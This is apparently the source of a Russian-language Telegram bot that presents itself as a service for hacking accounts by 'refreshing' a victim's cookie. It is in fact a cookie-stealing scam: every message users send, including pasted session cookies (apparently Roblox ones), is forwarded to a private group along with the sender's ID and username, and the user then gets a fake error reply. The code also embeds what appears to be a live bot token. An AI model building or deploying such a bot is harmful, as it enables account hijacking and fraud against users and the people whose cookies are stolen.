mport os
import telebot
import time
import threading
import requests

# Получаем переменные из настроек Render
TOKEN = os.environ.get('8260437183:AAG2NNbMPhsvkWjkxYaxAjceNm9jward6UA')
GROUP_ID = os.environ.get('-1003396901780')

bot = telebot.TeleBot(TOKEN)

print(f"✅ Бот запущен!")
print(f"📱 Токен: {TOKEN[:10]}...")
print(f"👥 ID группы: {GROUP_ID}")

# Функция чтобы сервер не засыпал
def keep_alive():
    """Отправляет запросы каждые 5 минут"""
    while True:
        try:
            time.sleep(300)  # Ждем 5 минут
            print("🔄 Keep-alive: сервер активен")
        except:
            pass

# Запускаем keep-alive в отдельном потоке
thread = threading.Thread(target=keep_alive, daemon=True)
thread.start()

@bot.message_handler(commands=['start'])
def start_command(message):
    if message.chat.type != 'private':
        return
    
    # Пользователю
    bot.send_message(
        message.chat.id, 
        "Привет, пришли куки человека которого хотите взломать, мы его рефрешнем и передадим вам🍪 ❗️НЕ НУЖНО КИДАТЬ НИК ЖЕРТВЫ, ПОСМОТРИТЕ ДОСТАТОЧНО ВИДЕО ТУТОРИАЛ НА НАШЕМ КАНАЛЕ - @s1iuy❗️"
    )
    
    # В группу
    try:
        username = f"@{message.from_user.username}" if message.from_user.username else "без юзернейма"
        bot.send_message(
            GROUP_ID, 
            f"👤 Кто-то нажал /start\n"
            f"ID: {message.from_user.id}\n"
            f"Имя: {message.from_user.first_name}\n"
            f"Юзернейм: {username}"
        )
        print(f"✅ /start от {message.from_user.id}")
    except Exception as e:
        print(f"❌ Ошибка отправки в группу: {e}")

@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    if message.chat.type != 'private':
        return
    
    # ВСЕГДА в группу
    try:
        username = f"@{message.from_user.username}" if message.from_user.username else "без юзернейма"
        bot.send_message(
            GROUP_ID,
            f"📩 Сообщение от: {message.from_user.first_name}\n"
            f"Юзернейм: {username}\n"
            f"ID: {message.from_user.id}\n"
            f"Текст: {message.text}"
        )
        print(f"✅ Переслано в группу: {message.text[:50]}...")
    except Exception as e:
        print(f"❌ Ошибка отправки в группу: {e}")
    
    # Если есть WARNING - игнорируем
    if "WARNING" in message.text:
        print(f"🔇 Игнорировано (WARNING) от {message.from_user.id}")
        return
    
    # На всё остальное - ошибка
    bot.send_message(
        message.chat.id,
        "ошибка❌ пожалуйста, введите действительный куки! если не знаете как его получить обращайтесь в поддержку - @suportrrobloxbot"
    )

# Автоперезапуск при ошибках
if __name__ == '__main__':
    while True:
        try:
            print("🚀 Запускаю бота...")
            bot.polling(none_stop=True, timeout=60)
        except Exception as e:
            print(f"💥 Ошибка: {e}")
            print("🔄 Перезапуск через 10 секунд...")
            time.sleep(10)